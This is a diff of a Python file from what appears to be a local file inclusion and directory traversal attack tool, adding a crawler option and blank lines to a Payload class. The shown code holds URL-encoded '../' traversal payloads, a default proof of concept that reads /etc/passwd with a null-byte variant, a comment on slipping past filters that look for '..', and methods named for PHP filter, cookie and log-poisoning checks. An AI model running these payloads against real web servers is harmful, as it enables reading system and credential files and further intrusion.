@@ -8,12 +8,15 @@ from urllib.error import URLError, HTTPError
 from termcolor import colored
 from proxies_list import fetch_proxy
 
+
+
 class Payload:
 
-	def __init__(self, url, outfile, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False):
+	def __init__(self, url, outfile, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False):
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
+		self.crawler = crawler
 		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
@@ -36,6 +39,9 @@ class Payload:
 		if initiate:
 			self.Attack()
 
+
+
+
 	def Attack(self):
 		if self.urlCheck():
 			self.dirTraversalCheck()
@@ -43,7 +49,10 @@ class Payload:
 			self.filterCheck()
 			self.cookieCheck()
 			self.logPoisonCheck()
-			
+
+
+
+
 	# It sends the url as is without decoding it first, so that it can bypass filters that look for ..
 	def hit(self, url):
 		if self.proxies:
@@ -61,6 +70,9 @@ class Payload:
     			print(colored('[-]', 'red', attrs=['bold']) + ' Error code: ', e.code)		
 		except URLError as e:
    			 print(colored('[-]', 'red', attrs=['bold']) + ' Reason: ', e.reason) 
+
+
+
 
 	# Checks if the url is valid
 	def urlCheck(self):
@@ -91,8 +103,8 @@ class Payload:
 		clean = re.sub(htmlchars, '', t)
 		return clean
 
-		
-		
+
+
 
 	# Checks for directory traversal
 	def dirTraversalCheck(self):
@@ -128,6 +140,8 @@ class Payload:
 				if self.verbosity > 0:
 					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
 
+	
+	
 	
 	# Checks if it can retrieve files with the php filter	
 	def filterCheck(self):
@@ -177,6 +191,8 @@ class Payload:
 				else:
 					if self.verbosity > 0:
 						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
+
+
 
 
 	def logPoisonCheck(self):
